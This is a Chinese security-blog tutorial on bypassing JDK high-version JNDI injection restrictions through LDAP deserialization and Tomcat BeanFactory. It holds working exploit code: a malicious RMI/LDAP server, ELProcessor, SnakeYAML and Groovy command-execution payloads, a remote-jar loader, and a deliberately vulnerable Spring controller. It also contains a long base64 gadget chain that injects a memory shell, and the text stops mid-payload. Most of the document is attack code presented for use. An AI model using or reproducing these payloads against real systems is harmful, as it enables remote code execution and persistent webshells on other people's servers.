回顾高版本JNDI改动
===========

LDAP改动
------

调用栈如下：

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-b2ffd615b1e383735a1c81bfee8d1ee8012d5796.png)​

InitialContext到GenericURLContext的内容都是JNDI功能共有的，为了实现动态协议转化。之后的PartialCompositeContext以及ComponentContext是LDAP功能封装一些环境设置。重点还是DirectoryManager的getObjectInstance

首先先从缓存寻找之前是否有加载过的工厂构造类，如果没有的话就直接往下去寻找Reference中的ObjectFactory类

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-bc1caa47ab36a0ba613cab11349ebdf1b036af14.png)​

getObjectFactoryFromReference的内容首先第一段helper的调用loadClass进行类加载。本质上是在调用Class.forName,指定类加载器为AppClassLoader进行全类名的类加载。很明显这一段我们是加载不到Factory类的，所以还是往下根据codebase进行类加载。

```java
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class&lt;?&gt; clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &amp;&amp;
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
```

这里的codebase实际上就是lookup中的去除协议和搜索类之后地址。factory的name是搜索类名。比如ldap://localhost:8085/shell​的话，那么codebase就是localhost:8085

继续跟进到helper的另一个传入了双形参的loadClass方法

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-fc4a753afd5c30d9ed3d4d7fb5ab0b8311b08970.png)​

然后我们比较一下8u191更新前的loadClass

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-a538a841f57383678f7a06e4fa69644537cb9c85.png)​

发现这里多了一个trustURLCodebase的判断，这也是高版本之后的对于远程codebase加载factory类的限制，默认是为false的，无法进行远程类加载。

那绕过点其实就在第一个helper.loadClass​中，也就是我们通过AppClassLoader去初始化本地工厂类--clas。最后return的时候是将该clas进行newInstance实例化之后再返回出去，作为参数赋值给factory，在检测了该factory不为空之后，调用它的getObjectInstance方法，之后的所有基于本地工厂类的攻击方式，都是依靠着这个getObjectInstance方法做文章

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-62b2dcabc0a08e702e45dea38e2965831e421f9d.png)​

RMI改动
-----

写一个RMI的恶意服务端

```java
package JNDI_High;

import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;

public class Evil_Reference {
        public static void main(String[] args) throws Exception{
                LocateRegistry.createRegistry(1099);
                InitialContext initialContext=new InitialContext();
                //Reference refObj=new Reference("evilref","evilref","http://localhost:8000/");
                ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
                ref.add(new StringRefAddr("forceString", "x=eval"));
                ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                        ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                        "(['calc']).start()\")"));
                //initialContext.rebind("ldap://localhost:10389/cn=TestLdap,dc=example,dc=com",ref);
                initialContext.rebind("rmi://localhost:1099/remoteobj",ref);
        }
}

```

然后由客户端initialContext.lookup一下rmi://localhost:1099/remoteobj​即可

来看调用栈

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-d334d42f57d2068642a485d537702251980af0ca.png)​

重点改动还是在decodeObject里面，这里RMI又自己新增了一段trustURLCode的判断。不过这里倒不是最影响的，因为它的判断逻辑是!trustURLCode​，而trustURLCode默认为flase，所以当这条判断逻辑前面两个，也就是Reference对象不为空，且远程codebase的构造factory的地址也不为空的话，该if判断必过，抛出异常The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.​。这也是RMI在高版本JDK中JNDI注入限制点。

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-8bf5b2cdaf92af8fa9695c238e6450d631a942a8.png)​

当我们指定本地工厂进行加载，或者利用其它绕过方式，没有进入该if判断后，依然调用NamingManager的getObjectInstance方法。

所以说到底，RMI和Ldap各自高版本限制的区别在于：

- RMI的高版本限制在JNDI的SPI功能实现--NamingManager之前，提前将Reference对象中的远程factory判断住，抛出异常。
- Ldap的高版本限制在于最后SPI接口功能实现DirectoryManager,这里说是DirectoryManager只是为了好区分，落脚点还是在NamingManager​的getObjectFactoryFromReference​方法中，最后一步加载远程工厂类的时候给catch住了，if ("true".equalsIgnoreCase(trustURLCodebase))​判断条件过后才能远程类加载工厂类，不过trustURLCodebase被默认设置为了false

JDNI-ldap攻击面扩展部分
================

原理解析
----

主要是关于扩展LDAP的一段反序列化攻击。漏洞点在获取工厂类的前面部分，具体类和具体方法就是LdapCtx#c\_lookup​,这其实并不难理解，不论是RMI还是LDAP，首先获取Reference对象的时候就是通过反序列化获取的，只不过RMI中也有一段decodeObject，那个是最终在解析工厂类了，而LDAP中则是在获取远程Reference对象

此时要想调用到Obj对象的decodeObject方法，就必须要满足这个条件：if (((Attributes)var4).get(Obj.JAVA\_ATTRIBUTES\[2\]) != null)​，什么意思呢？这里的JAVA\_ATTRIBUTES其实是一段属性值固定的字符串数组，结果为：static final String\[\] JAVA\_ATTRIBUTES = new String\[\]{"objectClass", "javaSerializedData", "javaClassName", "javaFactory", "javaCodeBase", "javaReferenceAddress", "javaClassNames", "javaRemoteLocation"};​，然后var4是由var25得来，而var25是由指定远程地址获取到的LdapResult中所对应的LdapEntry，这个LdapEntry也就是之后也是我们需要构造的一个对象。根据后续的几个if条件，LdapResult的status属性值不能为0，其次该LdapResult中的LdapEntry只能有一个。之后的var4就是该entry所对应的键值。

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-7160a22b7c09ff3beddad2a1c4c581161bcd8c28.png)​

跟进decodeObject方法，这代码已经被反编译的不成人样了，但是我们依然能够找到关键方法deserialzeObject。Var0参数就是我们传入的反序列化数据，如果想要走到deserializeObject方法，就必须满足if ((var1 = var0.get(JAVA\_ATTRIBUTES\[1\])) != null)​这段if判断，其实也就是从远程服务器中获取到的结果Entry中的javaSerializedData​键所对应的序列化值不能为空即可

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-634b89f274ff2837bb6889fa9f05adb2377b1bd3.png)​

继续跟进deserializeObject方法，注意此时的var0就是serializedObject的序列化数据的字节数组

这里经过ByteArrayInputStream封装之后，再经过一层ObjectInputStream的处理之后，调用readObject方法进行反序列化

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-f37c5b3ba9d5d65f384bfbf69afb347d8ef51421.png)​

具体构造利用
------

原理还是比较简单，就是看如何利用，其实就只有从头开始定位到恶意序列化数据如何传入的就行。总体是一个LdapResult，其中包含一个LdapEntry用来指定对应数据块。这个Entry里面至少包含两个键值对，一个是JavaClassName​键对应必须要有值，是啥无所谓。对应判断((Attributes)var4).get(Obj.JAVA\_ATTRIBUTES\[2\]) != null​。第二个是JavaSerializedData​必须要有值，并且这里存放的就是我们恶意序列化链的数据。

对应的构造代码：

```java
import JNDI_High.Server.Utils.CCEXP;
import JNDI_High.Server.Utils.SerializeUtil;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class OperationInterceptor extends InMemoryOperationInterceptor {

    public String protocol;

    public OperationInterceptor(String protocol){
        this.protocol=protocol;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult searchResult){
        String base = searchResult.getRequest().getBaseDN();
        Entry e = new Entry(base);

        try{
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", (byte[]) SerializeUtil.serialize(CCEXP.getPayloadCC6()));
            System.out.println("[" + protocol + "] Sending serialized gadget");

            searchResult.sendSearchEntry(e);
            searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        } catch (Exception exception){
            exception.printStackTrace();
        }

    }
```

用unboundid-ldapsdk​搭建的一个恶意Ldap服务器，InMemoryOperationInterceptor的主要功能就是起到一个拦截器的作用，当服务器接收到ldap请求时，会优先经过该拦截器，执行其中的逻辑。这里可以选择重写processSearchResult​方法，它的作用就是当接收到搜索请求时，会用他的逻辑来处理搜索结果。而这个结果就是我们需要构造的LdapResult。具体的构造在trycatch块中。其中SerializeUtil.serialize(CCEXP.getPayloadCC6())​主要是为了获取到的任意反序列化链的序列化数据，具体情况跟目标服务器中的依赖相关。这里我就选择CC了。

跟进一遍流程，看一下关键点

模拟被攻击端的代码就是initialContext.lookup()了，具体不多写。

直接来到第一段关键if判断，这里可以看到var4中此时存储了两段键值对，当取到javaclassname的时候，至少不为空，所以能够满足该if判断条件

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-0a73c5dacb4fd80ec50e0d8df8e5bbc820ba4cd9.png)​

再跟进decodeObject，此时的var0还是attributes，并且取出javaSerializedata不为空，所以顺利进入deserializeObject进行反序列化。有一个小点可以提一嘴，最开始的内容有一段获取var0的JAVA\_ATTRIBUTES\[4\]​键值，也就是获取键为javaCodebase​的值，这里其实将其置空也是没问题的，后续获取到的ClassLoader依然会从getContextClassLoader()​方法中获取。

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-8eb789e016655ec3b0647b7b2a48a410160a6cfd.png)​

总结待写：具体到哪些版本能够利用LDAP的反序列化绕过高版本JDK的限制。至少8u系列版本中，202是没问题的

高版本JDK下的JNDI具体利用
================

很大一部分都是依靠beanFactory来做文章，它存在于Tomcat的本地工厂类。但是beanFactory本身也是有依赖版本限制的，最高的版本是tomcat8.5.79版本

BeanFactory利用
-------------

有很大一部分的高版本绕过都是通过BeanFactory来的，但是这个利用方式有版本限制，说先就是BeanFactory是在taomcat8才被引用，在tomcat8.5.79存在一次安全更新，之后的8系列版本用不了了。在此之后我也这么认为，但是当我切换到tomcat9系列版本之后，又存在如下9系列版本是可以继续利用的：

tomcat9.x.x&lt;=tomcat9.0.62版本下，都可以利用BeanFactory进行JDK高版本绕过

tomcat10系列以及11版本的探索还未进行，只不过这部分的探索遇到了之后再进行吧

其实这些安全部分的修复，都是关于forceString trick的。具体内容可以参考tomcat对应版本的commit就好

### BeanFactory解析

首先要了解为什么BeanFactory能够作为本地工厂类达到绕过的效果。一切都基于JNDI处理查询和获取远程对象的逻辑，先获取工厂类，之后再调用工厂类的getObjectInstance​方法进行指定对象的查找。这里拿LDAP链最后DirectoryManager执行getObjectInstance​逻辑的来举例：

我们将封装了BeanFactory的Reference对象序列化之后，将结果绑定至LdapEntry的serializeData键值对中，这里就是扩展Ldap攻击面中讲到的逻辑了，他会先反序列化Reference对象，然后通过Reference中获取Factory对象的信息，根据这段info来创建工厂类

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-92b82d7d266c34b7fce25e962c427dca50952cdf.png)​

再跟进getObjectFactoryFromReference方法，看看最终是如何绕过的：

由于我们指定的工厂类是一个本地工厂类，并且给到的是全类名，所以能够直接通过help.loadClass​方法加载到，本且跟进loadClass发现他本质上还是在调用forName进行全类名搜索的类加载，所以肯定是能够加载到BeanFactory的

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-1a263231a5eec061fb4f8904a63b3c185364c67b.png)​

后面的if判断中，其中有一段class==null的判断，这里的话由于我们上面已经将clas加载到了，所以就不进入这段根据reference中的codebase加载工厂类的逻辑了，直接return出去。然后ldap关于高版本的远程类加载的限制就是在这个新的helper.loadClass(factoryName, codebase);​中，所以绕过就是这么产生的。

那么BeanFactory本身是怎么被利用的？它的getObjectInstance​方法有点小长，不过总体我们能够拆成3个部分：

- 从ResourceRef对象中取出sourceClass，也就是我们要利用的类。注意这个类必须是bean类，然后获取该bean的一些信息Ref，准备开始获取关键信息：forceString，addrs
- 如果此时的forceString不为空，说明要进行一段方法调用，此时取到的StringRefaddr键值对，对应的就是​,进一步将其提权，也就是将x=任意方法​提取出来，该任意方法就是等下要被调用的方法
- 开始循环遍历StringAddr，如果发现有一段不是forceString作为键的键值对，就将将其键所对应值取出（注意该对应值只能为String类型），然后将刚才forceString中取出的方法也取出（这个方法只能是public字段，因为是反射获取，但是并没有setAccessible）。最后将该对应值作为字符串参数，调用该方法

总结到这我们看一段如何构造ResourceRef的代码段就更容易理解了。

### ELProcessor利用

```java
import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class ScriptEngineManagerBypass {

    public Reference getBypass(){
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);

        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                "(['calc']).start()\")"));
        return ref;
    }
}
```

根绝上面对于BeanFactory的利用解析，那么就是将ELProcessor中的eval方法取出，并且将第二段StringRefAddr的键对应值取出，作为String类型的参数，调用eval方法。所以最终产生的利用效果伪代码如下：

```java
new ELProcessor().eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance()" +
                ".getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])']" +
                "(['calc']).start()\")")
```

既然能够代码执行，其实就有很多方式进行RCE或者其他更多的奇技淫巧了，这里只是最简单直接的JS引擎的RCE

### snakeyaml利用

snakeyaml中最基本的利用就是new org.yaml.snakeyaml.Yaml().load("snakeyamlpayload");​，这跟BeanFactory的利用条件是很适配的，只需要调用实例化方法之后，调用其某一公共方法就能够达到代码执行或者RCE的目的。

构造如下：

```java
package JNDI_High.bypass.BeanFactory;

import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class snakeyamlBypass {
    public Reference getBypass(){
        ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        String yamlpayload="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]";

        ref.add(new StringRefAddr("forceString","x=load"));
        ref.add(new StringRefAddr("x",yamlpayload));
        return ref;
    }
}
```

```java
if(controller.equals("snakeyaml_bypass")){
                e.addAttribute("javaClassName","foo");
                e.addAttribute("javaSerializedData",(byte[]) SerializeUtil.serialize(new snakeyamlBypass().getBypass()));
            }
```

这里的snakyaml payloadjar是https://github.com/artsploit/yaml-payload/blob/master/README.md​中提到的，构造步骤都写好了，注意编译java文件时，字节码版本和对应服务器要对应上

### GroovyShell利用

在groovy.lang.GroovyShell​包下存在public方法evaluate，并且我们能够通过传入单字符串参数进行groovy脚本执行

​![image](https://shs3.b.qianxin.com/attack_forum/2024/09/attach-1ca8c817099b117ae5503aee21fcb1845f592317.png)​

具体的构造如下：

```java
package JNDI_High.bypass.BeanFactory;

import org.apache.naming.ResourceRef;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

public class GroovyBypass {
    public Reference getBypass(){
        ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);

        ref.add(new StringRefAddr("forceString", "x=evaluate"));
        ref.add(new StringRefAddr("x", "\"calc\".execute()"));
        return ref;
    }
}

```

```java
.....         
        if(controller.equals("groovy_bypass")){
                e.addAttribute("javaClassName","foo");
                e.addAttribute("javaSerializedData",(byte[]) SerializeUtil.serialize(new GroovyBypass().getBypass()));
            }
            searchResult.sendSearchEntry(e);
            searchResult.setResult(new LDAPResult(0, ResultCode.SUCCESS));
```

写入内存马
-----

其实关于BeanFactory或者其他的不依靠BeanFactory的JNDI高版本绕过还有很多方式，这里我就只写了我自己学习到的，能够理解原理的几个方向。其他的比如结合JDBC来进行绕过，等我之后学完之后再详细出一篇，不过就不会补到这篇JNDI了，之后JDBC利用篇再补充。

稍微思考一下使用背景和使用条件，首先对应环境存在jndi注入，并且我们测得了具体的依赖的情况。然后是注入内存马必须要有代码执行，对于这一点，上述所有的利用方式都存在代码执行，但是要说JNDI高版本绕过的普适性（包括JDK版本，以及中间件版本等一系列情况），我会选择LDAP的反序列化打入。因为内存马注入的代码十分的长，不可能通过构造表达式的内容就能写好的，所以一定要将注入的逻辑和JNDI注入的逻辑分开。其实还有一段snakeyaml的攻击方式也是能够达到同样效果的。但是一切通过BeanFactory进行的JNDI注入绕过，一定离不开tomcat版本的限制，我想达到的效果至少是JDK17以上+Tomcat10以上的版本的内存马能够注入。综合以上几点才选择的LDAP反序列化打入内存马

开一段Springboot3的环境，也就是JDK17+tomcat10x版本的环境下，存在反序列化利用链，CC或者CB都可以。

两段路由都能用来测试，看过我之前那一篇高版本JDK模块化绕过文章的师傅应该对test路由还有点印象，这里又加上了JNDI测试的路由，重复利用一下（懒癌犯了）

```java
package org.stoocea.spring3test.Controller;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import sun.misc.Unsafe;

import javax.naming.InitialContext;
import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.Scanner;

@Controller
public class AdminController {
        @RequestMapping("/test")
        public void start(HttpServletRequest request) {
            try{
                String payload=request.getParameter("shellbyte");
                byte[] shell= Base64.getDecoder().decode(payload);
                ByteArrayInputStream byteArrayInputStream=new ByteArrayInputStream(shell);
                ObjectInputStream objectInputStream=new ObjectInputStream(byteArrayInputStream);
                objectInputStream.readObject();
                objectInputStream.close();
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        @RequestMapping("/JNDI")
        public void jndi(HttpServletRequest request){
            try{
                String JndiPayload=request.getParameter("JNDI");
                InitialContext initialContext=new InitialContext();
                initialContext.lookup(JndiPayload);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
}

```

然后看一下LDAP服务端我们是怎么构造的,这里其实就是我上面一直在用的思路，重写InMemoryOperationInterceptor​，自己构造一段Interceptor的逻辑，用来分各种情况进行讨论。（controller的思路是参考X1roz师傅的JDNIMap项目得来）

```java
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult searchResult){
        String base = searchResult.getRequest().getBaseDN();
        Entry e = new Entry(base);
        String controller="Ldap_High_Serialize_Bypass";
        try{

            if (controller.equals("Ldap_High_Serialize_Bypass")) {
                e.addAttribute("javaClassName", "foo");
                e.addAttribute("javaSerializedData", (byte[]) Base64.getDecoder().decode("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAAGa2V5a2V5c3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAGc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAHmphdmEubGFuZy5pbnZva2UuTWV0aG9kSGFuZGxlcwAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQABmxvb2t1cHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQAEWdldERlY2xhcmVkTWV0aG9kdXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AG3NxAH4AE3VxAH4AGAAAAAJwdXEAfgAYAAAAAHQABmludm9rZXVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABhzcQB+ABN1cQB+ABgAAAABdXIAAltCrPMX+AYIVOACAAB4cAAAOiLK/rq+AAAAMQHHAQAtb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL2Z1bmN0b3JzL3NoZWxsBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEADWdldFVybFBhdHRlcm4BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAvTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9mdW5jdG9ycy9zaGVsbDsBAAIvKggADAEADGdldENsYXNzTmFtZQEALm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5pbmplY3QIAA8BAA9nZXRCYXNlNjRTdHJpbmcBAApFeGNlcHRpb25zAQATamF2YS9pby9JT0V4Y2VwdGlvbgcAEwEAEGphdmEvbGFuZy9TdHJpbmcHABUBEHBINHNJQUFBQUFBQUFBS1ZYQzN4YlZSbi9ueWJ0VGRPd1I3TjF5enIyWW84MGZhUjdzblVQMW5hRmxUVWRySHZRRGNIYjlMYk5saVpwY3RPdHZGWFFpVThVSHloT25lSjhJSTROMHBVSnpCY29pSWlnSUNLKzN3OUVSVVhSK2ovbkptbmF0TjM4K2ZzbDk1eDd6dmMrMy9jLzMzM3NQdzg4QkdDNWFCU29pY2E3L1hwTUQvWVkvbUMwdHpjYVNYQU1oNDJnR1pMenJtUWthRWJqQ1g4b3NwOXJHb1RBelAxNnYrNFA2NUZ1ZjJOWVR5UmFvbnFuRWRkZ0V5amJyeC9RNDZidVR4angvckJoK2k4T2hVMjVWeWhRdENFVUNabWJCR3plaXQwQzlzWm9weUV3dFNVVU1WcVR2UjFHZktmZUVlWkthVXMwcUlkMzYvR1FmRTh2MnMyZVVFS2d0dVYvczNlOUN4b2NUdGd4UldDT3QyVmN5OWRMYzhRMUFyTW0ySmRDcGtraGJ0S01rTFNaOFZDa3V5RVpDaXYzWnpwUkp0WFlZK1NVYm95bHBKelo4QlNqQUhNWURUMFdNeUtkQXRYZWZNS0t2S1cwRm9xWWkvT2xvbm1NNHdGandJVUZsc2lGQWc0emFoRUx6UERtaXlEdkJWZ3NlWmVRdDdkenRjRFNjOUpOeG1Yd09xbWtRczZVdWtwRzdIS21nbmRmUThYWXFLMFhLQWgyOExHdlFhQ2swK2ppQ2FzTlJvLzB6YzM1SEM0c3h3b1o0WldVZTBoQUk5M2VDc252SGlGdE9oUTBZdktZTlZ4SXNpRFZLMEdIL01INFFNeU0raHREc1I3R2lFZlFyOGRYWmJiSE1ITmIwQkxSeS85ZURiVnBGV09FYUtnWE9LL04xSU1IQW5vc25ZUzIrcVkyQjdiUXFXN0RiSTRrVEQwUzVITEZoRkVjYTVrTEYrTVNKeHF3VldEK0tJSkV6QWo2MjR4ZzNEQzNHUU50Zk5Od3FjQzBzWUkxdFBDZ3FiNWh3RFRvaHQzTEtMblFpdTFPQkhDWkZlRnh6Tmt0YzNpSEU5dlFSaVpaaUpLMDJhSk1HTUZrUEdRTytLbGFrZTdDYm1ubEhoNUVaL1RpVUVRUE0ySGxVVXRkN2Rnck4vY0puRCtHUFdBa0VucTNzU1hVYlNSTXh0bEdiL2dNYkZudHdOVUM1Wk5RYTlBRmxrK2NqaFBva0FFTk90RUJGbEpSMkloMG16MEtYNXBkNkVLM0RBbmZpNUt4VHQwMHJLeGk5dEhCL1RnZ3VlaldEQ1crVnpkNy9BMmg3dWFJYVhUTDA0K1FyVlBwY0NFbWc5dUJQaG1EWmdaQnhUTGhSQlNtcklEbUNVcXRYMUljWkxLWTBWMnM5WGlqbmpCY0dKQWxHQURSeHRYQmhUV3JtaUpCQllSbFkwb3BMWWxXV3hUeDBaQ3l2VVBoRzIyeXhBaE1INmNPWlNHc1lTVjJNRlVLKy9WdzBram5WRTNTRElWckdoU3JBN2NRaDhjd2EzZ0xWWGRGNDYxNkw1bVduQVVwTW1YOFZ0enF4R0c4VGNESkpFMWI3c0E3YVB5K1BISU43eElvSmwzQU1IdWlQTUxONDJqSlo4dlZHemU2SlBiN0xRazA0RGE4Unhyd1hwYjF2dnh3YVhpZndPeUoyRFY4Z1BFTVJmcWpCK2p5T204Ky96Z2lLL0tYWExnREgzTGlnL2p3cUFxMmRqVjh4S3JnTkNTNnZlUEY4YVA0bUJOSDhIR0JLWVlLNHM0MHRqdndDZVpLSWhtcDZRMGxnalVOOVcxTm1SeGluTzlpdWtXTWd5UFlOUG9peU5wM0RKK1dVZm9NM2JYRU8vQTVIbGtXSkdtWFExYSt2THdGZEJtSjBmZDZtelh1TVBxU3NnNG4zay9FS00zSUo3QmtOL2Jvb1lpNmZ4ZU1XR2xaYjRaMGFVa082QjhmVGNWTHYxc1Axd2VEUklRY3FoUEU5UzcrNlh6dUFlNndUanJVYjJ4bkxZNFdMYXRJajhlM0oxblA4eTJlVU5RdkViWStIdGNIdUI1TG1neS9vZmZLZWt4UUlia0VGdVY1MVdPYU1mOVdQdG9zR2xtQ3hCNWkyNVRFcUlqUmxiUEZsRFdaR0IxRmdZVm5EVFRyUENpRGFxSHp4REduSC9HTUtSV1QrVEhHSmtjOGE0enZITml5VnMyYjNGc05qNmdyY1ZMbk5IeGQzU0lUZXFYaE1ZRmw1K2lNaG04eVJjN1ZCUTNmVXVrMytYbHIrRFlEUDJrR2FmZ09HNjl6UzB3Tno3QXFld3paaFVvY2R1RjdWdnYxcklXYlc5V09DOStIdHdSUDRIbFd2MFc4VzBLOUN5OVkxRC9rc1FXakVaTVJZbUdYajJxRGUvUjRtNHdIMFdKOXhWNFhmb1FmeS92cEp4YUF0MlZTZmJGMzBpU3hrdDJGbitIbjBwQmY4SFlqOTJWNm5FYWIwc0pmV1JiK09udnRiVEV5MTk0NEY0dHNNMzZMMzhtVzgvY3VyTVlhT2ZzalV6YW1ENFRaa3p2d0owdER2VW1PanFTODNNL1d5MmF4NzgvNFN3bWV3bDlaa3hrVXR2cDhBVTgrRm1jL0FmNkd2MHZJL0ljMHhlMUNOV3JrN0YrMEl6SEtqbVhqMkRIT3JjRW00dC80anpSa21LR09aU0tWY0FnaEF6WHN4TlBxbXlVblVaTEV4RjVqSkRrRVA2cG01MnJiMlJPUEhwU3RxdFh2Q2MwcGlvUkRZbnhmVWc4blpMTXlqaVY3WGNJcFNuamJDSmVWVlh2WWFNbG96TXBFZzZsOEdmMUliNngzaVNsaWFnbWVGTk5JbjBoMkpOSWZIV1hlNW5GN0lWRXEzTXdwTVNQVHpZK1dwNGt5Z3RaQk9SOWo0VWp6S21ZTGoxUE1FblBrcGJoRTlWVFo0bktKODJXRDlyU1k1OEoxdUo2bkloWlFwK3kvQW1LUndKYi8vL2FTNGJ4SExDN0I0MkxKT0NpUUpzODVtV1U1cmpadno5bW9rUGdjMXErNVJyYldScnF2azEwYXY4WnNER1QrM1c0VlN0d2gvRXcxaTZVaDJkVWxWNVpiUlpxbFdDbWJWdlhpRUpTM01OL3hORlpHSTEyaGJuWHR1cnB5Vm9qU2szTW9vMmxsZElDSXNpRVlWaC8wRHN4bW03TXl1TWFvN1ZpcnJ3c3VYNzFpeFNyZElUYktVKzJKaHBqU0Y4bGIwNHhHZ3diWDY3R1FoV01IalVVaGl1VVhKUUNIL0RaVzR3STFDZ2wxYW54QmpTV2M4Vk9lejJLKzFWT0M0T2oyRFdLcXp5MDIzNC9uT0RUY2p4ZnY1WElCbkh6SytnVG1vUlR6eVE2NExCYU81eW5CL0toUGl3dVRVdExXK2lvSE1XTzB2Tk1vYXgvRXJCTW9UMkgrQ1N6aU00V2xwK0E3aWFvUlhWTmc0M01ScFY4QVB4WXJmV1dXekxRK09adE9XOWlhU1BCSWE5N0lRRWlxWWwrbHJmS2hRYXc2bmhWWnBNeGRsaU9xT0N1cW1FcHFsU2lDWTFyVXMrU3djN